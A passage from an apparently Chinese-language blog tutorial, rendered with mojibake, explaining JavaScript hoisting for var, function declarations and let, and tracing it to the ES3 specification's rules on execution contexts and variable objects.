å¯æ˜¯å‡å¦‚ä½ åƒæˆ‘ä¸€æ¨£ï¼Œæƒ³è¦æœ‰æœä¸€æ—¥åœ¨è‡ªå·±çš„å±¥æ­·ä¸Šé¢æ”¾ä¸Šã€Œç²¾é€š JavaScriptã€çš„è©±ï¼Œé‚£å°é€™äº›æ±è¥¿å°±ä¸èƒ½é€ƒé¿ã€‚åŒæ™‚ä½ å¦‚æœå°åº•å±¤çš„é€™äº›ç´°ç¯€æ„ˆç†Ÿæ‚‰ï¼Œæœƒç¢°åˆ°çš„å•é¡Œå°±æ„ˆå°‘ï¼Œä¹Ÿæ„ˆèƒ½ç†è§£ç‚ºä»€éº¼æœƒæœ‰ hoisting çš„å‡ºç¾ï¼Œç•¶ä½ æƒ³è¦åœ¨æŠ€è¡“é€™æ¢è·¯ä¸Šèµ°å¾—æ›´é çˆ¬å¾—æ›´é«˜æ™‚ï¼Œæˆ‘è¦ºå¾—é€™äº›ç´°ç¯€æ˜¯å¾ˆé‡è¦çš„ã€‚
æ¥ä¸‹ä¾†ï¼Œæˆ‘å€‘å°±ä¸€æ­¥æ­¥ä¾†çœ‹ hoisting å§ï¼
ä»€éº¼æ˜¯ hoistingï¼Ÿåœ¨ JavaScript è£¡é¢ï¼Œå¦‚æœä½ è©¦åœ–å»å°ä¸€å€‹é‚„æ²’å®£å‘Šçš„è®Šæ•¸å–å€¼ï¼Œæœƒç™¼ç”Ÿä»¥ä¸‹éŒ¯èª¤ï¼š
console.log(a)// ReferenceError: a is not defined

æœƒå›å‚³ä¸€å€‹a is not definedçš„éŒ¯èª¤ï¼Œå› ç‚ºä½ é‚„æ²’å®£å‘Šé€™å€‹è®Šæ•¸ï¼Œæ‰€ä»¥ JavaScript ä¹Ÿæ‰¾ä¸åˆ°é€™è®Šæ•¸åœ¨å“ªï¼Œè‡ªç„¶å°±æœƒæ‹‹å‡ºéŒ¯èª¤ã€‚
å¯æ˜¯å¦‚æœä½ é€™æ¨£å­å¯«ï¼Œç¥å¥‡çš„äº‹æƒ…ç™¼ç”Ÿäº†ï¼š
console.log(a) // undefinedvar a

å¾ä»¥å‰å­¸ç¨‹å¼çš„æ™‚å€™æˆ‘å€‘å°±å­¸åˆ°äº†ä¸€å€‹è§€å¿µï¼Œã€Œç¨‹å¼æ˜¯ä¸€è¡Œä¸€è¡Œè·‘çš„ã€ï¼Œé‚£æ—¢ç„¶æ˜¯ä¸€è¡Œä¸€è¡Œè·‘çš„ï¼ŒåŸ·è¡Œåˆ°ç¬¬ä¸€è¡Œçš„æ™‚å€™ä¸æ˜¯é‚„æ²’æœ‰å®£å‘Šè®Šæ•¸ a å—ï¼Ÿé‚£ç‚ºä»€éº¼ä¸æ˜¯æ‹‹å‡ºa is not definedçš„éŒ¯èª¤ï¼Œè€Œæ˜¯è¼¸å‡ºäº†undefinedï¼Ÿ
é€™ç¨®ç¾è±¡å°±å«åš hoistingï¼Œæå‡ï¼Œåœ¨ç¬¬äºŒè¡Œçš„var aå› ç‚ºæŸç¨®åŸå› è¢«ã€Œæå‡ã€åˆ°äº†æœ€ä¸Šé¢ï¼Œæ‰€ä»¥ä¸Šé¢çš„ç¨‹å¼ç¢¼ä½ å¯ä»¥ã€Œæƒ³åƒã€æˆé€™æ¨£ï¼š
var aconsole.log(a) // undefined

æˆ‘æœƒç‰¹åˆ¥å¼·èª¿ã€Œæƒ³åƒã€ï¼Œæ˜¯å› ç‚ºç¨‹å¼ç¢¼çš„ä½ç½®å…¶å¯¦ä¸æœƒè¢«ç§»å‹•ï¼Œæ‰€ä»¥ä¸è¦æŠŠæå‡æƒ³æˆæ˜¯ JavaScript å¼•æ“å¹«ä½ æŠŠè®Šæ•¸å®£å‘Šéƒ½ã€Œç§»å‹•ã€åˆ°æœ€ä¸Šé¢ï¼Œé€™æ˜¯æœ‰å•é¡Œçš„ã€‚å®ƒèƒŒå¾Œçš„åŸç†è·Ÿç§»å‹•ç¨‹å¼ç¢¼ä¸€é»é—œä¿‚éƒ½æ²’æœ‰ã€‚
å†ä¾†é‚„æœ‰ä¸€é»è¦ç‰¹åˆ¥æ³¨æ„ï¼Œé‚£å°±æ˜¯åªæœ‰è®Šæ•¸çš„å®£å‘Šæœƒæå‡ï¼Œè³¦å€¼ä¸æœƒï¼Œçœ‹çœ‹ä»¥ä¸‹ç¯„ä¾‹ä½ å°±æ‡‚äº†ï¼š
console.log(a) // undefinedvar a = 5

ä¸Šé¢çš„ç¨‹å¼ç¢¼ä½ å¯ä»¥ã€Œæƒ³åƒã€æˆé€™æ¨£ï¼š
var aconsole.log(a) // undefineda = 5

ä½ å¯ä»¥æŠŠvar a = 5é€™å¥è©±åˆ†æˆå…©å€‹æ­¥é©Ÿï¼Œç¬¬ä¸€å€‹éšæ®µæ˜¯å®£å‘Šè®Šæ•¸ï¼švar aï¼Œç¬¬äºŒå€‹éšæ®µæ˜¯è³¦å€¼ï¼ša = 5ï¼Œåªæœ‰å‰é¢çš„è®Šæ•¸å®£å‘Šæœƒè¢«æå‡ï¼Œè³¦å€¼ä¸æœƒã€‚
åˆ°é€™é‚Šä½ å¯èƒ½è¦ºå¾—é‚„è¡Œï¼Œåªæ˜¯é ­è…¦æœ‰ä¸€é»é»æ··äº‚ï¼Œé‚£æ­å–œä½ ï¼Œç­‰ä¸€ä¸‹é‚„æœ‰æ›´å¤šæ±è¥¿æœƒè®“ä½ æ›´äº‚ï¼Œè®“æˆ‘å€‘å†æŠŠå¹¾å€‹æ±è¥¿åŠ é€²ä¾†ï¼Œçœ‹çœ‹èƒ½å¤ æå¾—å¤šè¤‡é›œã€‚
å¦‚æœæˆ‘å€‘åƒä¸‹é¢é€™æ¨£åšï¼Œæœƒè¼¸å‡ºä»€éº¼ï¼Ÿ
function test(v)&#123;  console.log(v)  var v = 3&#125;test(10)

ç°¡å–®å˜›ï¼Œæ ¹æ“šå‰›å‰›å­¸éçš„ï¼ŒæŠŠä¸Šé¢çš„ç¨‹å¼ç¢¼è®Šæ›æˆä»¥ä¸‹å½¢å¼ï¼š
function test(v)&#123;  var v  console.log(v)  v = 3&#125;test(10)

ç­”æ¡ˆæ˜¯undefinedï¼è¼•è¼•é¬†é¬†ã€‚
å¯æ˜¯ç‘å‡¡ï¼Œç­”æ¡ˆæ˜¯10è€Œä¸æ˜¯undefinedã€‚
å…¶å¯¦è®Šæ›çš„éç¨‹å°äº†ï¼Œåªæ˜¯éºæ¼äº†ä¸€å€‹å› ç´ ï¼šå‚³é€²ä¾†çš„åƒæ•¸ã€‚æŠŠé€™å€‹å› ç´ åŠ é€²å»ä»¥å¾Œï¼Œå¯ä»¥çœ‹æˆæ˜¯é€™æ¨£ï¼š
function test(v)&#123;  var v = 10 // å› ç‚ºä¸‹é¢å‘¼å« test(10)  var v  console.log(v)  v = 3&#125;test(10)

é€™æ™‚å€™ä½ å¯èƒ½é‚„æ˜¯æœƒå•ï¼šã€Œå¯æ˜¯æˆ‘åœ¨ log ä»¥å‰ä¸æ˜¯é‡æ–°å®£å‘Šäº†ä¸€æ¬¡è®Šæ•¸ä¸¦ä¸”æ²’æœ‰çµ¦å€¼å—ï¼Ÿé‚£å®ƒä¸æ˜¯æœƒè¢«è¦†è“‹æˆundefiendå—ï¼Ÿã€
æˆ‘å€‘å†ä¾†çœ‹ä¸€å€‹ç°¡å–®çš„å°ä¾‹å­ï¼š
var v = 5var vconsole.log(v)

ç­”æ¡ˆæœƒæ˜¯5è€Œä¸æ˜¯undefinedï¼Œæƒ³ç†è§£é€™å€‹è¡Œç‚ºï¼Œä½ å¯ä»¥å†å›æƒ³ä¸€ä¸‹å‰é¢æŠŠä¸€å€‹å¥å­åˆ†æˆå…©å¡Šï¼Œå®£å‘Šè·Ÿè³¦å€¼ï¼Œå¦‚æœæˆ‘å€‘é€™æ¨£åˆ‡åˆ†å†åŠ ä¸Š hoisting çš„è©±ï¼Œå…¶å¯¦ä¸Šé¢ç¨‹å¼ç¢¼å¯ä»¥æƒ³åƒæˆé€™æ¨£ï¼š
var vvar vv = 5console.log(v)

é€™æ¨£ä½ å°±çŸ¥é“ç‚ºä»€éº¼ç­”æ¡ˆæ˜¯ 5 äº†ã€‚
æ­¤æ™‚çš„ä½ æ‡‰è©²è¦ºå¾—é ­è…¦æœ‰é»å¿«çˆ†ç‚¸äº†ï¼Œç‚ºä»€éº¼é€™éº¼å¤šè¦å‰‡è¦è¨˜ï¼Ÿåˆ¥æ“”å¿ƒï¼Œæˆ‘å€‘é‚„æœ‰æœ€å¾Œä¸€å€‹ä¾‹å­ï¼Œä¿è­‰è®“ä½ å«è‹¦é€£å¤©ã€‚
console.log(a) //[Function: a]var afunction a()&#123;&#125;

é™¤äº†è®Šæ•¸å®£å‘Šä»¥å¤–ï¼Œfunction çš„å®£å‘Šä¹Ÿæœƒæå‡è€Œä¸”å„ªå…ˆæ¬Šæ¯”è¼ƒé«˜ï¼Œå› æ­¤ä¸Šé¢çš„ç¨‹å¼ç¢¼æœƒè¼¸å‡ºfunctionè€Œä¸æ˜¯undefinedã€‚
å¥½ï¼ŒåŸºæœ¬çš„ hoisting æ¦‚å¿µå°±åˆ°é€™é‚ŠçµæŸäº†ï¼Œå¹«ä½ ç•«ä¸€ä¸‹é‡é»ï¼š

è®Šæ•¸å®£å‘Šè·Ÿå‡½å¼å®£å‘Šéƒ½æœƒæå‡
åªæœ‰å®£å‘Šæœƒæå‡ï¼Œè³¦å€¼ä¸æœƒæå‡
åˆ¥å¿˜äº†å‡½å¼è£¡é¢é‚„æœ‰å‚³é€²ä¾†çš„åƒæ•¸

åˆ¥æ€¥ï¼Œé‚„æœ‰ ES6 æ–°å¢çš„ let è·Ÿ const æ²’æœ‰è¬›ã€‚
let è·Ÿ const èˆ‡ hoistingåœ¨ ES6 è£¡é¢æˆ‘å€‘æœ‰äº†æ–°çš„å…©å€‹å®£å‘Šè®Šæ•¸çš„é—œéµå­—ï¼Œlet èˆ‡ constï¼Œé€™å…©å€‹å° hoisting çš„è¡Œç‚ºæ˜¯å·®ä¸å¤šçš„ï¼Œå› æ­¤æˆ‘ä¸‹é¢åªæ‹¿ let ä¾†èˆ‰ä¾‹ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹ä»¥ä¸‹ç¨‹å¼ç¢¼ï¼š
console.log(a) // ReferenceError: a is not definedlet a

è¬å¤©è¬åœ°ï¼Œçµ‚æ–¼æ²’æœ‰é‚£éº¼å¤šè¦å‰‡è¦è¨˜äº†ï¼
å¾ä»¥ä¸Šç¨‹å¼ç¢¼çœ‹èµ·ä¾†ï¼Œlet èˆ‡ const æ‡‰è©²æ˜¯æ²’æœ‰è®Šæ•¸æå‡å§ï¼Œå¦å‰‡å°±ä¸æœƒæ‹‹å‡ºé€™å€‹ Error äº†ã€‚
æˆ‘ä¹‹å‰ä¹Ÿæ˜¯å¾ˆå¤©çœŸé€™æ¨£æƒ³çš„ï¼Œç›´åˆ°æˆ‘çœ‹åˆ°ä»¥ä¸‹ç¯„ä¾‹ï¼š
var a = 10function test()&#123;  console.log(a)  let a&#125;test()

å¦‚æœ let çœŸçš„æ²’æœ‰ hoisting çš„è©±ï¼Œç­”æ¡ˆæ‡‰è©²æœƒè¼¸å‡º10ï¼Œå› ç‚º log é‚£ä¸€è¡Œæœƒå­˜å–åˆ°å¤–é¢çš„var a = 10çš„é€™å€‹è®Šæ•¸ï¼Œå¯æ˜¯ï¼ï¼ï¼
ç­”æ¡ˆå»æ˜¯ï¼šReferenceError: a is not definedã€‚
æ„æ€å°±æ˜¯ï¼Œå®ƒçš„ç¢ºæå‡äº†ï¼Œåªæ˜¯æå‡å¾Œçš„è¡Œç‚ºè·Ÿ var æ¯”è¼ƒä¸ä¸€æ¨£ï¼Œæ‰€ä»¥ä¹çœ‹ä¹‹ä¸‹ä½ æœƒä»¥ç‚ºå®ƒæ²’æœ‰æå‡ã€‚
é€™å€‹è§€å¿µæˆ‘å€‘æœƒåœ¨ä¹‹å¾Œè©³ç´°è¬›è§£ï¼Œä½†åœ¨é€™ä¹‹å‰æˆ‘å€‘å…ˆåšå€‹ç°¡å–®çš„ç¸½çµã€‚
æœ‰å¾ˆå¤šæåˆ° hoisting çš„æ–‡ç« ï¼Œè¬›åˆ°é€™é‚Šå°±å·®ä¸å¤šäº†ï¼Œå°±å¤§æ¦‚è¬›ä¸€äº› hoisting çš„è¡Œç‚ºä»¥åŠ let èˆ‡ const çš„ä¸åŒä¹‹è™•ï¼Œä½†æˆ‘è¦ºå¾—åªè¬›åˆ°é€™è£¡å…¶å¯¦æ˜¯å¾ˆå¯æƒœçš„ä¸€ä»¶äº‹æƒ…ã€‚
å› ç‚ºå¦‚æœä½ åªç†è§£åˆ°é€™å€‹ç¨‹åº¦ï¼Œå°±æœƒä»¥ç‚º hoisting ä¸éå°±æ˜¯ä¸€å¤§å †è¤‡é›œçš„è¦å‰‡è¦è¨˜ï¼Œæ ¹æœ¬æ²’ä»€éº¼ï¼Œèª°èƒ½å¤ è¨˜é€™éº¼å¤šè¦å‰‡ï¼Ÿä¸å°±æ˜¯èƒŒæ›¸è€Œå·²å—ï¼Ÿ
é€™æ˜¯å› ç‚ºä¸Šé¢é‚£äº›åªè®“ä½ ç†è§£äº†ã€Œè¡¨é¢ã€ï¼Œèˆ‰å‡ºå¹¾å€‹ä¸åŒçš„ä¾‹å­è·Ÿä½ èªªæœƒæœ‰é€™æ¨£çš„è¡Œç‚ºç™¼ç”Ÿï¼Œå¯æ˜¯å»æ²’æœ‰è·Ÿä½ èªªã€Œç‚ºä»€éº¼æœƒé€™æ¨£ã€ï¼Œæˆ–è€…æ˜¯ã€Œå¯¦éš›ä¸Šæ˜¯æ€éº¼é‹ä½œçš„ã€ï¼Œè‹¥æ˜¯ä½ æƒ³çœŸæ­£äº†è§£ hoisting æ˜¯ä»€éº¼ï¼Œå¿…é ˆè¦æ‰¾å‡ºä»¥ä¸‹å…©å€‹å•é¡Œçš„ç­”æ¡ˆï¼Œä¸€ä½†æ‰¾å‡ºäº†ï¼Œä¿è­‰ä½ ä»»ç£äºŒè„ˆç›´æ¥è¢«æ‰“é€šï¼š

ç‚ºä»€éº¼æˆ‘å€‘éœ€è¦ hoistingï¼Ÿ
Hoisting åˆ°åº•æ˜¯æ€éº¼é‹ä½œçš„ï¼Ÿ

ç‚ºä»€éº¼æˆ‘å€‘éœ€è¦ hoistingï¼Ÿåœ¨å•é€™æ¨£çš„ä¸€å€‹å•é¡Œæ™‚ï¼Œå…¶å¯¦ä½ å¯ä»¥åéä¾†æƒ³ï¼šã€Œå¦‚æœæˆ‘å€‘æ²’æœ‰ hoisting æœƒæ€æ¨£ï¼Ÿã€
ç¬¬ä¸€ï¼Œæˆ‘å€‘ä¸€å®šè¦å…ˆå®£å‘Šè®Šæ•¸æ‰å¯ä»¥ä½¿ç”¨ã€‚
é€™é»å…¶å¯¦å¾ˆä¸éŒ¯ï¼Œç•¢ç«Ÿé€™æ˜¯ä¸€å€‹å¥½ç¿’æ…£ã€‚
ç¬¬äºŒï¼Œæˆ‘å€‘ä¸€å®šè¦å…ˆå®£å‘Šå‡½å¼æ‰å¯ä»¥ä½¿ç”¨ã€‚
é€™ä¸€é»å°±ä¸å¤ªå¥½äº†ï¼Œå¾ˆä¸æ–¹ä¾¿ï¼Œå¦‚æœæ˜¯é€™æ¨£çš„è©±é‚£å¯èƒ½åœ¨æ¯å€‹æª”æ¡ˆä½ éƒ½å¿…é ˆæŠŠ function å®£å‘Šæ”¾åˆ°æœ€ä¸Šé¢å»ï¼Œæ‰èƒ½ä¿è­‰ä½ åº•ä¸‹çš„ç¨‹å¼ç¢¼éƒ½å¯ä»¥ call åˆ°é€™äº› functionã€‚
ç¬¬ä¸‰ï¼Œæ²’æœ‰è¾¦æ³•é”æˆ function äº’ç›¸å‘¼å«ã€‚
èˆ‰å€‹ä¾‹å­ï¼š
function loop(n)&#123;  if (n&gt;1) &#123;    logEvenOrOdd(--n)  &#125;&#125;  function logEvenOrOdd(n) &#123;  console.log(n, n % 2 ? &#x27;Odd&#x27; : &#x27;Even&#x27;)  loop(n)&#125;  loop(10)

æˆ‘å€‘åœ¨loopè£¡é¢å‘¼å«logEvenOrOddï¼Œåœ¨logEvenOrOddè£¡é¢ä¹Ÿå‘¼å«loopï¼Œå¦‚æœæˆ‘å€‘æ²’æœ‰ hoistingï¼Œé‚£ä»¥ä¸Šçš„ç¨‹å¼ç¢¼å°±ä¸å¯èƒ½é”æˆï¼Œå› ç‚ºä½ ä¸å¯èƒ½åŒæ™‚åšåˆ° A åœ¨ B ä¸Šé¢è€Œ B åˆåœ¨ A ä¸Šé¢ã€‚
æ‰€ä»¥ç‚ºä»€éº¼æˆ‘å€‘éœ€è¦ hoistingï¼Ÿå°±æ˜¯ç‚ºäº†è¦è§£æ±ºä¸Šé¢çš„å•é¡Œã€‚
ç‚ºäº†å¢æ·»é€™ä¸€å€‹èªªæ³•çš„æ­£ç¢ºæ€§ï¼Œæˆ‘å¼•ç”¨ä¸€ç¯‡æ–‡ç« çµ¦å¤§å®¶çœ‹ï¼Œåœ¨ Note 4. Two words about â€œhoistingâ€. è£¡é¢æœ‰æåˆ°ä½œè€…ç™¼äº†å€‹ Twitter å•èªª hoisting çš„ç›®çš„åˆ°åº•æ˜¯ä»€éº¼ï¼Œç„¶å¾Œ JavaScript çš„ä½œè€…æœ‰å‡ºä¾†å›æ‡‰ï¼Œä»¥ä¸‹æ˜¯æ–‡ç« è£¡é¢é™„çš„åŸæ–‡è·Ÿå›æ‡‰ï¼š

By the way, recently I raised this topic on Twitter and also mentioned as one of the reasons the mutual recursion. Brendan Eich also gave an acknowledgment that FDs hoisting is â€œfor mutual recursion &amp; generally to avoid painful bottom-up ML-like orderâ€.

å¦‚æœæƒ³çœ‹å®Œæ•´å°è©±æˆªåœ–ï¼Œå¯ä»¥çœ‹é€™ç¯‡æ–‡ç« ï¼šJavaScriptç³»åˆ—æ–‡ç« ï¼šå˜é‡æå‡å’Œå‡½æ•°æå‡ï¼Œæœ€ä¸‹é¢æœ‰é™„ã€‚
hoisting åˆ°åº•æ˜¯æ€éº¼é‹ä½œçš„ï¼Ÿç¾åœ¨æˆ‘å€‘çŸ¥é“äº†ä»€éº¼æ˜¯ hoistingï¼ŒçŸ¥é“äº†ç‚ºä»€éº¼éœ€è¦ hoistingï¼Œæ¥è‘—å°±æ˜¯æ¬ ç¼ºçš„æœ€å¾Œä¸€å¡Šæ‹¼åœ–äº†ï¼šåˆ°åº• hoisting æ˜¯æ€éº¼é‹ä½œçš„ï¼Ÿ
è¦å›ç­”é€™å€‹å•é¡Œï¼Œæœ€å¥½çš„æ–¹æ³•å°±æ˜¯å»æ‰¾ ECMAScript çš„è¦æ ¼æ›¸ä¾†çœ‹ï¼Œå°±åƒä½ ä»Šå¤©æƒ³ç ”ç©¶å‹åˆ¥è½‰æ›çš„å•é¡Œï¼Œè§£æ³•ä¸€æ¨£æ˜¯å»æ‰¾è¦æ ¼æ›¸ä¾†çœ‹ï¼Œç†ç”±å¾ˆç°¡å–®ï¼Œå› ç‚ºé‚£äº›è¦å‰‡éƒ½æ¸…æ¸…æ¥šæ¥šå¯«åœ¨ä¸Šé¢äº†ã€‚
ECMAScript æœ‰å¾ˆå¤šç‰ˆæœ¬ï¼Œè¶Šå¾Œé¢çš„ç‰ˆæœ¬è¦æ ¼è¶Šå¤šï¼Œæ‰€ä»¥ç‚ºäº†æ–¹ä¾¿èµ·è¦‹ï¼Œæˆ‘å€‘åº•ä¸‹ç”¨ ES3 ç•¶ä½œç¯„ä¾‹ã€‚
å¦‚æœä½ çœ‹é ES3 çš„è¦å‰‡ï¼Œæœƒç™¼ç¾ç”¨ hoisting ç•¶é—œéµå­—å®Œå…¨æ‰¾ä¸åˆ°æ±è¥¿ï¼Œè€Œèˆ‡ hoisting é€™ç¾è±¡æœ‰é—œçš„æ®µè½å…¶å¯¦åœ¨ç¬¬åç« ï¼šExecution Contextsã€‚
é€™é‚Šå…ˆéå¸¸ç°¡å–®ä»‹ç´¹ä¸€ä¸‹ä»€éº¼æ˜¯ Execution Contextsï¼ˆä»¥ä¸‹ç°¡ç¨± ECï¼‰ï¼Œæ¯ç•¶ä½ é€²å…¥ä¸€å€‹ function çš„æ™‚å€™ï¼Œå°±æœƒç”¢ç”Ÿä¸€å€‹ ECï¼Œè£¡é¢å„²å­˜è·Ÿé€™å€‹ function æœ‰é—œçš„ä¸€äº›è³‡è¨Šï¼Œä¸¦ä¸”æŠŠé€™å€‹ EC æ”¾åˆ° stack è£¡é¢ï¼Œç•¶ function åŸ·è¡Œå®Œä»¥å¾Œï¼Œå°±æœƒæŠŠ EC çµ¦ pop å‡ºä¾†ã€‚
ç¤ºæ„åœ–å¤§æ¦‚å°±åƒé€™æ¨£ï¼Œè¦è¨˜å¾—é™¤äº† function æœ‰ EC ä»¥å¤–ï¼Œé‚„æœ‰ä¸€å€‹ global ECï¼š
ï¼ˆä¾†æºï¼šhttps://medium.freecodecamp.org/lets-learn-javascript-closures-66feb44f6a44ï¼‰
ç°¡è€Œè¨€ä¹‹å‘¢ï¼Œæ‰€æœ‰ function éœ€è¦çš„è³‡è¨Šéƒ½æœƒå­˜åœ¨ ECï¼Œä¹Ÿå°±æ˜¯åŸ·è¡Œç’°å¢ƒè£¡é¢ï¼Œä½ è¦ä»€éº¼éƒ½å»é‚£é‚Šæ‹¿å°±å°äº†ã€‚
ECMAScript æ˜¯é€™æ¨£æè¿°çš„ï¼š

When control is transferred to ECMAScript executable code, control is entering an execution context. Active execution contexts logically form a stack. The top execution context on this logical stack is the running execution context.

å†ä¾†å°±æ˜¯é‡é»äº†ï¼Œåœ¨10.1.3 Variable Instantiationçš„åœ°æ–¹æ˜¯é€™æ¨£å¯«çš„ï¼š

Every execution context has associated with it a variable object. Variables and functions declared in the source text are added as properties of the variable object. For function code, parameters are added as properties of the variable object.

æ¯å€‹ EC éƒ½æœƒæœ‰ç›¸å°æ‡‰çš„ variable objectï¼ˆä»¥ä¸‹ç°¡ç¨± VOï¼‰ï¼Œåœ¨è£¡é¢å®£å‘Šçš„è®Šæ•¸è·Ÿå‡½å¼éƒ½æœƒè¢«åŠ é€² VO è£¡é¢ï¼Œå¦‚æœæ˜¯ functionï¼Œé‚£åƒæ•¸ä¹Ÿæœƒè¢«åŠ åˆ° VO è£¡ã€‚
é¦–å…ˆï¼Œä½ å¯ä»¥æŠŠ VO æƒ³åƒæˆå°±æ˜¯ä¸€å€‹ JavaScript çš„ç‰©ä»¶å°±å¥½ã€‚
å†ä¾†ï¼ŒVO ä»€éº¼æ™‚å€™æœƒç”¨åˆ°ï¼Ÿä½ åœ¨å­˜å–å€¼çš„æ™‚å€™æœƒç”¨åˆ°ï¼Œä¾‹å¦‚èªª var a = 10 é€™ä¸€å¥ï¼Œä¹‹å‰æœ‰è¬›éå¯ä»¥åˆ†æˆå·¦å³å…©å¡Šï¼š

var aï¼šå» VO è£¡é¢æ–°å¢ä¸€å€‹å±¬æ€§å«åš aï¼ˆå¦‚æœæ²’æœ‰ a é€™å€‹å±¬æ€§çš„è©±ï¼‰ä¸¦åˆå§‹åŒ–æˆ undefined
a = 10ï¼šå…ˆåœ¨ VO è£¡é¢æ‰¾åˆ°å«åš a çš„å±¬æ€§ï¼Œæ‰¾åˆ°ä¹‹å¾Œè¨­å®šç‚º 10

ï¼ˆé€™é‚Šå¦‚æœ VO è£¡é¢æ‰¾ä¸åˆ°æ€éº¼è¾¦ï¼Ÿå®ƒæœƒé€é scope chain ä¸æ–·å¾€ä¸Šå°‹æ‰¾ï¼Œå¦‚æœæ¯ä¸€å±¤éƒ½æ‰¾ä¸åˆ°å°±æœƒæ‹‹å‡ºéŒ¯èª¤ã€‚è‡³æ–¼å°‹æ‰¾è·Ÿå»ºç«‹ scope chain çš„éç¨‹é›–ç„¶èˆ‡æœ¬æ–‡æœ‰é—œä½†å¯ä»¥è¬›å¾—å¤ªå¤šäº†ï¼Œé¡å¤–å†é–‹ä¸€ç¯‡æœƒæ¯”è¼ƒé©åˆï¼Œé€™é‚Šå°±å…ˆä¸æäº†ï¼‰
æ¥è‘—ä¾†çœ‹ä¸‹ä¸€æ®µï¼š

Which object is used as the variable object and what attributes are used for the properties depends on the type of code, but the remainder of the behaviour is generic. On entering an execution context, the properties are bound to the variable object in the following order:

æœ€ç²¾è¯çš„åªæœ‰é€™ä¸€å¥ï¼šã€ŒOn entering an execution context, the properties are bound to the variable object in the following orderã€ï¼Œåœ¨é€²å…¥ EC çš„æ™‚å€™ï¼ŒæœƒæŒ‰ç…§ä»¥ä¸‹é †åºæŠŠæ±è¥¿æ”¾åˆ° VO è£¡é¢ï¼š
ä¸‹é¢çš„æ®µè½æœ‰é»é•·ï¼Œæˆ‘ç¯€éŒ„ä¸€ä¸‹ï¼š

For function code: for each formal parameter, as defined in the FormalParameterList, create a property of the variable object whose name is the Identifier and whose attributes are determined by the type of code. The values of the parameters are supplied by the caller as arguments to [[Call]].
If the caller supplies fewer parameter values than there are formal parameters, the extra formal parameters have value undefined

ç°¡å–®ä¾†èªªå°±æ˜¯å°æ–¼åƒæ•¸ï¼Œå®ƒæœƒç›´æ¥è¢«æ”¾åˆ° VO è£¡é¢å»ï¼Œå¦‚æœæœ‰äº›åƒæ•¸æ²’æœ‰å€¼çš„è©±ï¼Œé‚£å®ƒçš„å€¼æœƒè¢«åˆå§‹åŒ–æˆ undefinedã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œå‡è¨­æˆ‘ function é•·é€™æ¨£ï¼š
function test(a, b, c) &#123;&#125;test(10)

é‚£æˆ‘çš„ VO å°±é•·é€™æ¨£ï¼š
&#123;  a: 10,  b: undefined,  c: undefined&#125;

æ‰€ä»¥åƒæ•¸æ˜¯ç¬¬ä¸€å€‹å„ªå…ˆé †åºï¼Œå†ä¾†æˆ‘å€‘çœ‹ç¬¬äºŒå€‹ï¼š

For each FunctionDeclaration in the code, in source text order, create a property of the variable object whose name is the Identifier in the FunctionDeclaration, whose value is the result returned by creating a Function object as described in 13, and whose attributes are determined by the type of code. 
If the variable object already has a property with this name, replace its value and attributes. Semantically, this step must follow the creation of FormalParameterList properties.

å°æ–¼ function çš„å®£å‘Šï¼Œä¸€æ¨£åœ¨ VO è£¡é¢æ–°å¢ä¸€å€‹å±¬æ€§ï¼Œè‡³æ–¼å€¼çš„è©±å°±æ˜¯å»ºç«‹ function å®Œä¹‹å¾Œå›å‚³çš„æ±è¥¿ï¼ˆå¯ä»¥æƒ³æˆå°±æ˜¯ä¸€å€‹æŒ‡å‘ function çš„æŒ‡æ¨™å°±å¥½ï¼‰ã€‚
å†ä¾†æ˜¯é‡é»ï¼šã€Œå¦‚æœ VO è£¡é¢å·²ç¶“æœ‰åŒåçš„å±¬æ€§ï¼Œå°±æŠŠå®ƒè¦†è“‹æ‰ã€ï¼Œèˆ‰å€‹å°ä¾‹å­ï¼š
function test(a)&#123;  function a()&#123;&#125;&#125;test(1)

VO æœƒé•·çš„åƒé€™æ¨£ï¼ŒåŸæœ¬çš„åƒæ•¸aè¢«è¦†è“‹æ‰äº†ï¼š
&#123;  a: function a&#125;

æœ€å¾Œä¾†çœ‹å°æ–¼è®Šæ•¸çš„å®£å‘Šè©²æ€éº¼è™•ç†ï¼š

For each VariableDeclaration or VariableDeclarationNoIn in the code, create a property of the variable object whose name is the Identifier in the VariableDeclaration or VariableDeclarationNoIn, whose value is undefined and whose attributes are determined by the type of code. If there is already a property of the variable object with the name of a declared variable, the value of the property and its attributes are not changed. 
Semantically, this step must follow the creation of the FormalParameterList and FunctionDeclaration properties. In particular, if a declared variable has the same name as a declared function or formal parameter, the variable declaration does not disturb the existing property.

å°æ–¼è®Šæ•¸ï¼Œåœ¨ VO è£¡é¢æ–°å¢ä¸€å€‹å±¬æ€§ä¸¦ä¸”æŠŠå€¼è¨­ç‚º undefinedï¼Œå†ä¾†æ˜¯é‡é»ï¼šã€Œå¦‚æœ VO å·²ç¶“æœ‰é€™å€‹å±¬æ€§çš„è©±ï¼Œå€¼ä¸æœƒè¢«æ”¹è®Šã€
ä¾†é‡æ–°æ•´ç†ä¸€ä¸‹ï¼Œç•¶æˆ‘å€‘åœ¨é€²å…¥ä¸€å€‹ EC çš„æ™‚å€™ï¼ˆä½ å¯ä»¥æŠŠå®ƒæƒ³æˆå°±æ˜¯åœ¨åŸ·è¡Œ function å¾Œï¼Œä½†é‚„æ²’é–‹å§‹è·‘ function å…§éƒ¨çš„ç¨‹å¼ç¢¼ä»¥å‰ï¼‰ï¼ŒæœƒæŒ‰ç…§é †åºåšä»¥ä¸‹ä¸‰ä»¶äº‹ï¼š

æŠŠåƒæ•¸æ”¾åˆ° VO è£¡é¢ä¸¦è¨­å®šå¥½å€¼ï¼Œå‚³ä»€éº¼é€²ä¾†å°±æ˜¯ä»€éº¼ï¼Œæ²’æœ‰å€¼çš„è¨­æˆ undefined
æŠŠ function å®£å‘Šæ”¾åˆ° VO è£¡ï¼Œå¦‚æœå·²ç¶“æœ‰åŒåçš„å°±è¦†è“‹æ‰
æŠŠè®Šæ•¸å®£å‘Šæ”¾åˆ° VO è£¡ï¼Œå¦‚æœå·²ç¶“æœ‰åŒåçš„å‰‡å¿½ç•¥

åœ¨ä½ çœ‹å®Œè¦æ ¼ä¸¦ä¸”ç¨å¾®ç†è§£ä»¥å¾Œï¼Œä½ å°±å¯ä»¥ç”¨é€™å€‹ç†è«–ä¾†è§£é‡‹æˆ‘å€‘å‰é¢çœ‹éçš„ç¨‹å¼ç¢¼äº†ï¼š
function test(v)&#123;  console.log(v)  var v = 3&#125;test(10)

